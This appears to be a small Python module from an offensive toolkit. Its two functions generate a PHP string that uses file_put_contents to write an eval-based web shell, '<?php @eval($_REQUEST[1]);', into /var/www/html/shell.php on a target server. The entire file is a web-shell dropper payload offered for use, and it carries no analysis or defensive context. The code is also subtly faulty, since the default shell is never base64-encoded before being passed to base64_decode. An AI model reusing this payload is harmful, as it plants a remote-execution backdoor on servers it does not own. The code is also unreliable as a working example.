#!/usr/bin/env python3
# -*- coding: utf-8 -*-


def exp_upload_shell(path="/var/www/html/shell.php", data=""):
    """file_put_contents('%s',base64_decode('%s'));<br/>
    default shell : <?php @eval($_REQUEST[1]);
    """
    if not data:
        data = "<?php @eval($_REQUEST[1]);"
    return """file_put_contents('%s',base64_decode('%s'));
    """ % (path, data)


def exp_upload_shell_rsa_abs():
    """Default path="/var/www/html/shell.php"
    """
    return exp_upload_shell("/var/www/html/shell.php")
